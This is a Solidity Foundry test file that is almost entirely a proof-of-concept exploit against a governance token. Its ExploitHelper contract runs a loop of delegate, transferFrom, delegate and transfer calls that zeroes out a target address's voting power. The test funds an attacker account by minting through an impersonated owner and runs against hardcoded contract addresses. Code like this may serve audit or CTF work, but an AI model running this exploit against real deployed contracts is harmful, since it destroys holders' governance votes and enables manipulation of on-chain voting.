// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function approve(address target, uint256 amount) external;
    function mint(address _to, uint256 _amount) external;
    function getCurrentVotes(address account) external view returns (uint256);
    function balanceOf(address target) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function delegate(address delegatee) external;
}

contract ExploitHelper {
    function run(IERC20 token, address target) public {
        while (token.getCurrentVotes(target) != 0) {
            // Set target as delegate
            token.delegate(target);
            uint256 amount = token.balanceOf(msg.sender);
            if (token.getCurrentVotes(target) < amount)
                amount = token.getCurrentVotes(target);
            token.transferFrom(msg.sender, address(this), amount);
            token.delegate(address(this));
            token.transfer(msg.sender, token.balanceOf(address(this)));
        }
    }
}


contract VulnTest is Test {
    address public token = 0x6f4217e1eF964D24e2F700E86Cb28ec81cAD5205;
    address public target = 0x08A08Ae509d35ee5DbC2c4C85a642f15de992408;
    address public attacker;
    address public owner = 0xA32d14D42bbA9EEb5987500CE1C284971f9eaDd8;

    function setUp() public {
        vm.startPrank(owner);
        attacker = vm.addr(1233333);
        IERC20(token).mint(attacker, 10000000*10**18);
        vm.stopPrank();
        console.log("attacker token balance : %d", IERC20(token).balanceOf(attacker));
        console.log("target token balance : %d", IERC20(token).balanceOf(target));
    }

    function test_attack() public {
        vm.startPrank(attacker);
        ExploitHelper helper = new ExploitHelper();
        console.log("token.getCurrentVotes(target) : %d", IERC20(token).getCurrentVotes(target));
        IERC20(token).approve(address(helper), type(uint256).max);
        helper.run(IERC20(token), target);
        console.log("token.getCurrentVotes(target) : %d", IERC20(token).getCurrentVotes(target));
        vm.stopPrank();
    }
}
